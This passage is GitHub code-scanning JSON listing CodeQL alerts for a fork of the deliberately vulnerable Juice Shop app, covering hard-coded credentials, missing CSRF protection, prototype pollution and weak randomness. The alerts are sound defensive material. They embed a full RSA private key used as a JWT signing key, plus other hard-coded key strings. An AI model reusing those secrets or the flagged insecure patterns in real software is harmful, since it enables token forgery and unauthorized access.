header."},"location":{"path":"test/api/passwordApiSpec.ts","start_line":81,"end_line":81,"start_column":106,"end_column":122},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/80/instances","dismissal_approved_by":null},{"number":79,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/79","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/79","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"kekse\" is used as key."},"location":{"path":"server.ts","start_line":280,"end_line":280,"start_column":24,"end_column":31},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/79/instances","dismissal_approved_by":null},{"number":78,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/78","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/78","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"pa4qacea4VK9t9nGv7yZtwmj\" is used as key."},"location":{"path":"lib/insecurity.ts","start_line":44,"end_line":44,"start_column":67,"end_column":93},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/78/instances","dismissal_approved_by":null},{"number":77,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/77","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/77","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----\" is used as jwt key.\nThe hard-coded value \"-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----\" is used as key."},"location":{"path":"lib/insecurity.ts","start_line":23,"end_line":23,"start_column":20,"end_column":902},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/77/instances","dismissal_approved_by":null},{"number":76,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/76","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/76","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"placeholder-public-key\" is used as jwt key.\nThe hard-coded value \"placeholder-public-key\" is used as jwt key.\nThe hard-coded value \"placeholder-public-key\" is used as jwt key."},"location":{"path":"lib/insecurity.ts","start_line":22,"end_line":22,"start_column":83,"end_column":107},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/76/instances","dismissal_approved_by":null},{"number":75,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/75","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/75","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-token-validation","severity":"error","description":"Missing CSRF middleware","name":"js/missing-token-validation","tags":["external/cwe/cwe-352","security"],"full_description":"Using cookies without CSRF protection may allow malicious websites to submit requests on behalf of the user.","help":"# Missing CSRF middleware\nWebsites that rely on cookie-based authentication may be vulnerable to cross-site request forgery (CSRF). Specifically, a state-changing request should include a secret token so the request can't be forged by an attacker. Otherwise, unwanted requests can be submitted on behalf of a user who visits a malicious website.\n\nThis is typically mitigated by embedding a session-specific secret token in each request. This token is then checked as an additional authentication measure. A malicious website should have no way of guessing the correct token to embed in the request.\n\n\n## Recommendation\nUse a middleware package such as `lusca.csrf` to protect against CSRF attacks.\n\n\n## Example\nIn the example below, the server authenticates users before performing the `changeEmail` POST action:\n\n\n```javascript\nconst app = require(\"express\")(),\n  cookieParser = require(\"cookie-parser\"),\n  bodyParser = require(\"body-parser\"),\n  session = require(\"express-session\");\n\napp.use(cookieParser());\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));\n\n// ...\n\napp.post(\"/changeEmail\", function(req, res) {\n  const userId = req.session.id;\n  const email = req.body[\"email\"];\n  // ... update email associated with userId\n});\n\n```\nThis is not secure. An attacker can submit a POST `changeEmail` request on behalf of a user who visited a malicious website. Since authentication happens without any action from the user, the `changeEmail` action would be executed, despite not being initiated by the user.\n\nThis vulnerability can be mitigated by installing a CSRF protecting middleware handler:\n\n\n```javascript\nconst app = require(\"express\")(),\n  cookieParser = require(\"cookie-parser\"),\n  bodyParser = require(\"body-parser\"),\n  session = require(\"express-session\"),\n  csrf = require('lusca').csrf;\n\napp.use(cookieParser());\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));\napp.use(csrf());\n\n// ...\n\napp.post(\"/changeEmail\", function(req, res) {\n  const userId = req.session.id;\n  const email = req.body[\"email\"];\n  // ... update email associated with userId\n});\n\n```\n\n## References\n* OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))\n* NPM: [lusca](https://www.npmjs.com/package/lusca)\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This cookie middleware is serving a request handler without CSRF protection.\nThis cookie middleware is serving a request handler without CSRF protection.\nThis cookie middleware is serving a request handler without CSRF protection.\nThis cookie middleware is serving a request handler without CSRF protection.\nThis cookie middleware is serving a request handler without CSRF protection."},"location":{"path":"server.ts","start_line":280,"end_line":280,"start_column":11,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/75/instances","dismissal_approved_by":null},{"number":74,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/74","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/74","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/prototype-polluting-assignment","severity":"warning","description":"Prototype-polluting assignment","name":"js/prototype-polluting-assignment","tags":["external/cwe/cwe-078","external/cwe/cwe-079","external/cwe/cwe-094","external/cwe/cwe-400","external/cwe/cwe-471","external/cwe/cwe-915","security"],"full_description":"Modifying an object obtained via a user-controlled property name may lead to accidental mutation of the built-in Object prototype, and possibly escalate to remote code execution or cross-site scripting.","help":"# Prototype-polluting assignment\nMost JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.\n\nOne way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.\n\n\n## Recommendation\nUse an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.\n\nAlternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.\n\n\n## Example\nIn the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\nOne way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos.get(id);\n    if (!items) {\n        items = new Map();\n        req.sessions.todos.set(id, items);\n    }\n    items.set(req.query.name, req.query.text);\n    res.end(200);\n});\n\n```\nAnother way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    if (id === '__proto__' || id === 'constructor' || id === 'prototype') {\n        res.end(403);\n        return;\n    }\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\n\n## References\n* MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)\n* MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This assignment may alter Object.prototype if a malicious '__proto__' string is injected from user controlled input.\nThis assignment may alter Object.prototype if a malicious '__proto__' string is injected from user controlled input."},"location":{"path":"lib/accuracy.ts","start_line":66,"end_line":66,"start_column":5,"end_column":25},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/74/instances","dismissal_approved_by":null},{"number":73,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/73","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/73","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/insecure-randomness","severity":"warning","description":"Insecure randomness","name":"js/insecure-randomness","tags":["external/cwe/cwe-338","security"],"full_description":"Using a cryptographically weak pseudo-random number generator to generate a security-sensitive value may allow an attacker to predict what value will be generated.","help":"# Insecure randomness\nUsing a cryptographically weak pseudo-random number generator to generate a security-sensitive value, such as a password, makes it easier for an attacker to predict the value.\n\nPseudo-random number generators generate a sequence of numbers that only approximates the properties of random numbers. The sequence is not truly random because it is completely determined by a relatively small set of initial values, the seed. If the random number generator is cryptographically weak, then this sequence may be easily predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically secure pseudo-random number generator if the output is to be used in a security-sensitive context. As a rule of thumb, a value should be considered \"security-sensitive\" if predicting it would allow the attacker to perform an action that they would otherwise be unable to perform. For example, if an attacker could predict the random password generated for a new user, they would be able to log in as that new user.\n\nFor JavaScript on the NodeJS platform, `crypto.getRandomBytes` provides a cryptographically secure pseudo-random byte generator. Note that the conversion from bytes to numbers can introduce bias that breaks the security.\n\nFor JavaScript in the browser, `crypto.getRandomValues` provides a cryptographically secure pseudo-random number generator.\n\n\n## Example\nThe following examples show different ways of generating a password.\n\nIn the first case, we generate a fresh password by appending a random integer to the end of a static string. The random number generator used (`Math.random`) is not cryptographically secure, so it may be possible for an attacker to predict the generated password.\n\n\n```javascript\nfunction insecurePassword() {\n    // BAD: the random suffix is not cryptographically secure\n    var suffix = Math.random();\n    var password = \"myPassword\" + suffix;\n    return password;\n}\n\n```\nIn the second example, a cryptographically secure random number generator is used for the same purpose. In this case, it is much harder to predict the generated integers.\n\n\n```javascript\nfunction securePassword() {\n    // GOOD: the random suffix is cryptographically secure\n    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];\n    var password = \"myPassword\" + suffix;\n    \n    // GOOD: if a random value between 0 and 1 is desired\n    var secret = window.crypto.getRandomValues(new Uint32Array(1))[0] * Math.pow(2,-32);\n}\n\n```\n\n## References\n* Wikipedia: [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n* Mozilla Developer Network: [Crypto: getRandomValues()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues).\n* NodeJS: [crypto.randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This uses a cryptographically insecure random number generated at Math.random() in a security 